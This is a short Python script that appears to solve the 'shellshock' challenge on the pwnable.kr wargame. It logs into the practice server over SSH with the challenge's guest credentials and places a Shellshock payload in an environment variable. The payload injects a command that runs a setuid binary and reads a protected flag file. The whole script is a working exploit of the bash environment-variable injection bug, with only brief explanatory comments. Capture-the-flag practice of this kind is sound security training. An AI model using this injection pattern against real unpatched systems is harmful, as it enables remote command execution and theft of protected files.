from pwn import *

# shellshock
host = 'pwnable.kr'
user = 'shellshock'
password = 'guest'
port = 2222

# Notes
#   * Shellshock is a super famous bug in the bash shell
#   * tl;dr set an environment variable to some specific structure and get RCE

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  env = {"x" : "() { :;}; /bin/cat /home/shellshock/flag"}
  p = s.process(['./shellshock'], env=env)
  print p.recvall()

if __name__ == '__main__':
  attack()
